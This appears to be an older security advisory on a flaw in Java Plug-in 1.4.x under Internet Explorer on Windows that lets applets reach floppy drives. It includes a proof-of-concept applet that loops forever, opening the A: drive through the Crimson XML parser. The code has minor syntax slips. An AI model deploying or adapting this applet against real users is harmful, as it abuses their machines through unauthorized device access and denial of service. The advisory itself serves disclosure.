A weakness has been reported in Java implementations that may constitute unauthorized access by Java applets to floppy devices. This weakness appears to present a flaw in the Java security model.

This issue was reported in Java Plug-in 1.4.x versions on Microsoft Windows operating systems, when run with Internet Explorer. Other environments and versions may also be affected.

import java.awt.Label;

public class MyFloppySucks extends java.applet.Applet {
private Label m_labVersionVendor;
public MyFloppySucks () //constructor
{
m_labVersionVendor = new Label ("Java Floppy Stress Testing Applet,
(2003) www.illegalaccess.org" +" / Java Version: " +
System.getProperty("java.version")+
" from "+System.getProperty("java.vendor"));
this.add(m_labVersionVendor);
}
public void paint(java.awt.Graphics g) {
while (1==1)
try {

org.apache.crimson.tree.XmlDocument.createXmlDocument("file:///a:/",false);
}
catch (Exception e) {
System.out.println("Java Floppy Stress Testing Applet,
(2003) www.illegalaccess.org");
}
}
